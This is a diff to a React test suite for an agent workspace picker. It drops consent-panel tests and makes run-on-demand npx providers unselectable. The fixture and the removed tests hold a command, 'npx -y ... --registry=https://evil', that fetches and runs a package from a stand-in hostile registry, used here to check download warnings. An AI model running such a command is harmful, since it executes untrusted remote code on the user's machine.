@@ -1536,12 +1536,12 @@ describe("Workspace sessions", () => {
     authentication: "unknown" as const,
     protocol: "stream-json",
   };
-  // Started OK on this machine: the only run-on-demand kind the picker keeps.
+  // Run-on-demand: the workspace picker never offers it, whatever its start history.
   const npxProvider = {
     id: "codex-acp",
     executable: "@agentclientprotocol/codex-acp@1.10.0",
     acpAvailable: true,
-    authentication: "ok" as const,
+    authentication: "unknown" as const,
     protocol: "acp" as const,
     origin: "npx-wrapper" as const,
     launchArgs: ["--registry=https://evil"],
@@ -1609,7 +1609,7 @@ describe("Workspace sessions", () => {
     expect(sessionCreate).toHaveBeenCalledWith("workspace-1", "acp", "grok");
   });
 
-  it("requires consent for the only npx provider before creating a session", async () => {
+  it("an npx-only catalog never starts a session from New workspace: the picker shows the empty state", async () => {
     vi.mocked(providersList).mockResolvedValue({
       providers: [npxProvider],
       unreadableDirs: 0,
@@ -1626,15 +1626,11 @@ describe("Workspace sessions", () => {
     await act(async () => newWorkspace.click());
     await act(async () => undefined);
 
-    expect(document.querySelector('[aria-label="Confirm agent"]')).not.toBeNull();
+    const picker = document.querySelector('[aria-label="Choose agent"]');
+    expect(picker?.textContent).toContain("No agent CLI is installed on this machine.");
+    expect(picker?.textContent).toContain("Run on demand (npx)");
+    expect(document.querySelector('[aria-label="Confirm agent"]')).toBeNull();
     expect(sessionCreate).not.toHaveBeenCalled();
-
-    const confirm = document.querySelector<HTMLButtonElement>(".workspace-primary-action");
-    if (confirm === null) throw new Error("Confirm button did not render");
-    await act(async () => confirm.click());
-    await act(async () => undefined);
-
-    expect(sessionCreate).toHaveBeenCalledWith("workspace-1", "acp", "codex-acp");
   });
 
   it("surfaces a provider-list failure without creating a workspace or session", async () => {
@@ -2915,286 +2911,6 @@ describe("Workspace sessions", () => {
     expect(
       cardB.querySelector<HTMLButtonElement>(".permission-card-primary-action")?.disabled,
     ).toBe(false);
-  });
-
-  it("shows consent panel when picking an npx provider and does not call create", async () => {
-    vi.mocked(providersList).mockResolvedValue({
-      providers: [grokProvider, npxProvider],
-      unreadableDirs: 0,
-    });
-    root = createRoot(container);
-    await act(async () => {
-      await openListedSessionsForTest();
-      root.render(<Workspace />);
-    });
-    await act(async () => undefined);
-
-    const newWorkspace = container.querySelector<HTMLButtonElement>(".workspace-project-add");
-    if (newWorkspace === null) throw new Error("new workspace control did not render");
-    await act(async () => newWorkspace.click());
-    await act(async () => undefined);
-
-    const codexOption = Array.from(
-      document.querySelectorAll<HTMLButtonElement>(".workspace-surface-option"),
-    ).find((button) => button.textContent?.includes("codex-acp"));
-    if (codexOption === undefined) throw new Error("codex-acp option did not render");
-    await act(async () => codexOption.click());
-    await act(async () => undefined);
-    expect(document.querySelector('[aria-label="Confirm agent"]')).not.toBeNull();
-    expect(document.body.textContent).toContain("@agentclientprotocol/codex-acp@1.10.0");
-    expect(document.body.textContent).toContain(
-      "npx -y @agentclientprotocol/codex-acp@1.10.0 --registry=https://evil",
-    );
-    expect(document.body.textContent).toContain("npx will download and run third-party code");
-    expect(sessionCreate).not.toHaveBeenCalled();
-  });
-
-  it("names the command and the download in Confirm's accessible description", async () => {
-    vi.mocked(providersList).mockResolvedValue({
-      providers: [grokProvider, npxProvider],
-      unreadableDirs: 0,
-    });
-    root = createRoot(container);
-    await act(async () => {
-      await openListedSessionsForTest();
-      root.render(<Workspace />);
-    });
-    await act(async () => undefined);
-
-    const newWorkspace = container.querySelector<HTMLButtonElement>(".workspace-project-add");
-    if (newWorkspace === null) throw new Error("new workspace control did not render");
-    await act(async () => newWorkspace.click());
-    await act(async () => undefined);
-
-    const codexOption = Array.from(
-      document.querySelectorAll<HTMLButtonElement>(".workspace-surface-option"),
-    ).find((button) => button.textContent?.includes("codex-acp"));
-    if (codexOption === undefined) throw new Error("codex-acp option did not render");
-    await act(async () => codexOption.click());
-    await act(async () => undefined);
-
-    // Focus lands on Confirm when the card opens, so its description is the
-    // whole of what a screen-reader user hears before approving a package
-    // download. Resolve the ids to their TEXT rather than asserting the
-    // attribute exists: the spoken words are the thing under test, and an
-    // aria-describedby pointing at a missing or empty node announces nothing
-    // while still satisfying an attribute check.
-    const confirm = Array.from(document.querySelectorAll<HTMLButtonElement>("button")).find(
-      (button) => button.textContent?.trim() === "Confirm",
-    );
-    if (confirm === undefined) throw new Error("Confirm did not render");
-    expect(document.activeElement).toBe(confirm);
-
-    const described = (confirm.getAttribute("aria-describedby") ?? "")
-      .split(/\s+/)
-      .filter((id) => id.length > 0)
-      .map((id) => document.querySelector(`#${id}`)?.textContent ?? "")
-      .join(" ");
-
-    expect(described).toContain(
-      "npx -y @agentclientprotocol/codex-acp@1.10.0 --registry=https://evil",
-    );
-    expect(described).toContain("download and run third-party code");
-  });
-
-  it("Confirm on consent panel calls create exactly once", async () => {
-    vi.mocked(providersList).mockResolvedValue({
-      providers: [grokProvider, npxProvider],
-      unreadableDirs: 0,
-    });
-    vi.mocked(sessionCreate).mockResolvedValue({
-      ...terminal("session-codex", "Agent"),
-      kind: "acp",
-    });
-    root = createRoot(container);
-    await act(async () => {
-      await openListedSessionsForTest();
-      root.render(<Workspace />);
-    });
-    await act(async () => undefined);
-
-    const newWorkspace = container.querySelector<HTMLButtonElement>(".workspace-project-add");
-    if (newWorkspace === null) throw new Error("new workspace control did not render");
-    await act(async () => newWorkspace.click());
-    await act(async () => undefined);
-
-    const codexOption = Array.from(
-      document.querySelectorAll<HTMLButtonElement>(".workspace-surface-option"),
-    ).find((button) => button.textContent?.includes("codex-acp"));
-    if (codexOption === undefined) throw new Error("codex-acp option did not render");
-    await act(async () => codexOption.click());
-    await act(async () => undefined);
-
-    const confirm = document.querySelector<HTMLButtonElement>(".workspace-primary-action");
-    if (confirm === null) throw new Error("Confirm button did not render");
-    await act(async () => confirm.click());
-    await act(async () => undefined);
-
-    expect(sessionCreate).toHaveBeenCalledTimes(1);
-    expect(sessionCreate).toHaveBeenCalledWith("workspace-1", "acp", "codex-acp");
-    expect(document.querySelector('[aria-label="Confirm agent"]')).toBeNull();
-    expect(document.querySelector('[aria-label="Choose agent"]')).toBeNull();
-  });
-
-  it("Cancel on consent panel returns to option list without creating", async () => {
-    vi.mocked(providersList).mockResolvedValue({
-      providers: [grokProvider, npxProvider],
-      unreadableDirs: 0,
-    });
-    root = createRoot(container);
-    await act(async () => {
-      await openListedSessionsForTest();
-      root.render(<Workspace />);
-    });
-    await act(async () => undefined);
-
-    const newWorkspace = container.querySelector<HTMLButtonElement>(".workspace-project-add");
-    if (newWorkspace === null) throw new Error("new workspace control did not render");
-    await act(async () => newWorkspace.click());
-    await act(async () => undefined);
-
-    const codexOption = Array.from(
-      document.querySelectorAll<HTMLButtonElement>(".workspace-surface-option"),
-    ).find((button) => button.textContent?.includes("codex-acp"));
-    if (codexOption === undefined) throw new Error("codex-acp option did not render");
-    await act(async () => codexOption.click());
-    await act(async () => undefined);
-
-    expect(document.querySelector('[aria-label="Confirm agent"]')).not.toBeNull();
-    const cancel = Array.from(
-      document.querySelectorAll<HTMLButtonElement>(".workspace-secondary-action"),
-    ).find((button) => button.textContent === "Cancel");
-    if (cancel === undefined) throw new Error("Cancel button did not render");
-    await act(async () => cancel.click());
-    await act(async () => undefined);
-
-    expect(document.querySelector('[aria-label="Confirm agent"]')).toBeNull();
-    expect(document.querySelector('[aria-label="Choose agent"]')).not.toBeNull();
-    expect(sessionCreate).not.toHaveBeenCalled();
-  });
-
-  it("Escape on consent panel returns to option list without creating", async () => {
-    vi.mocked(providersList).mockResolvedValue({
-      providers: [grokProvider, npxProvider],
-      unreadableDirs: 0,
-    });
-    root = createRoot(container);
-    await act(async () => {
-      await openListedSessionsForTest();
-      root.render(<Workspace />);
-    });
-    await act(async () => undefined);
-
-    const newWorkspace = container.querySelector<HTMLButtonElement>(".workspace-project-add");
-    if (newWorkspace === null) throw new Error("new workspace control did not render");
-    await act(async () => newWorkspace.click());
-    await act(async () => undefined);
-
-    const codexOption = Array.from(
-      document.querySelectorAll<HTMLButtonElement>(".workspace-surface-option"),
-    ).find((button) => button.textContent?.includes("codex-acp"));
-    if (codexOption === undefined) throw new Error("codex-acp option did not render");
-    await act(async () => codexOption.click());
-    await act(async () => undefined);
-
-    expect(document.querySelector('[aria-label="Confirm agent"]')).not.toBeNull();
-
-    await act(async () => {
-      window.dispatchEvent(new KeyboardEvent("keydown", { key: "Escape", bubbles: true }));
-    });
-
-    expect(document.querySelector('[aria-label="Confirm agent"]')).toBeNull();
-    expect(document.querySelector('[aria-label="Choose agent"]')).not.toBeNull();
-    expect(sessionCreate).not.toHaveBeenCalled();
-  });
-
-  // Escape from a composing field is the IME's cancel: the consent must
-  // not be cancelled and focus must not be yanked back to the trigger.
-  it("an Escape from an open composition leaves the consent standing", async () => {
-    vi.mocked(providersList).mockResolvedValue({
-      providers: [grokProvider, npxProvider],
-      unreadableDirs: 0,
-    });
-    root = createRoot(container);
-    await act(async () => {
-      await openListedSessionsForTest();
-      root.render(<Workspace />);
-    });
-    await act(async () => undefined);
-
-    const newWorkspace = container.querySelector<HTMLButtonElement>(".workspace-project-add");
-    if (newWorkspace === null) throw new Error("new workspace control did not render");
-    await act(async () => newWorkspace.click());
-    await act(async () => undefined);
-
-    const codexOption = Array.from(
-      document.querySelectorAll<HTMLButtonElement>(".workspace-surface-option"),
-    ).find((button) => button.textContent?.includes("codex-acp"));
-    if (codexOption === undefined) throw new Error("codex-acp option did not render");
-    await act(async () => codexOption.click());
-    await act(async () => undefined);
-
-    expect(document.querySelector('[aria-label="Confirm agent"]')).not.toBeNull();
-
-    await act(async () => {
-      window.dispatchEvent(
-        new KeyboardEvent("keydown", { key: "Escape", bubbles: true, isComposing: true }),
-      );
-    });
-
-    expect(document.querySelector('[aria-label="Confirm agent"]')).not.toBeNull();
-    expect(sessionCreate).not.toHaveBeenCalled();
-
-    // Positive control: outside a composition the Escape still cancels, so
-    // a guard that returns unconditionally fails here.
-    await act(async () => {
-      window.dispatchEvent(new KeyboardEvent("keydown", { key: "Escape", bubbles: true }));
-    });
-    expect(document.querySelector('[aria-label="Confirm agent"]')).toBeNull();
-    expect(document.querySelector('[aria-label="Choose agent"]')).not.toBeNull();
-  });
-
-  it("double-click on Confirm creates only once", async () => {
-    vi.mocked(providersList).mockResolvedValue({
-      providers: [grokProvider, npxProvider],
-      unreadableDirs: 0,
-    });
-    vi.mocked(sessionCreate).mockResolvedValue({
-      ...terminal("session-codex", "Agent"),
-      kind: "acp",
-    });
-    root = createRoot(container);
-    await act(async () => {
-      await openListedSessionsForTest();
-      root.render(<Workspace />);
-    });
-    await act(async () => undefined);
-
-    const newWorkspace = container.querySelector<HTMLButtonElement>(".workspace-project-add");
-    if (newWorkspace === null) throw new Error("new workspace control did not render");
-    await act(async () => newWorkspace.click());
-    await act(async () => undefined);
-
-    const codexOption = Array.from(
-      document.querySelectorAll<HTMLButtonElement>(".workspace-surface-option"),
-    ).find((button) => button.textContent?.includes("codex-acp"));
-    if (codexOption === undefined) throw new Error("codex-acp option did not render");
-    await act(async () => codexOption.click());
-    await act(async () => undefined);
-
-    const confirm = document.querySelector<HTMLButtonElement>(".workspace-primary-action");
-    if (confirm === null) throw new Error("Confirm button did not render");
-    const rowsBefore = container.querySelectorAll(".workspace-row").length;
-    await act(async () => {
-      confirm.click();
-      confirm.click();
-    });
-    await act(async () => undefined);
-
-    expect(sessionCreate).toHaveBeenCalledTimes(1);
-    expect(sessionCreate).toHaveBeenCalledWith("workspace-1", "acp", "codex-acp");
-    // Reuse, not mint: the row count is unchanged.
-    expect(container.querySelectorAll(".workspace-row").length).toBe(rowsBefore);
   });
 
   describe("session attention badges", () => {
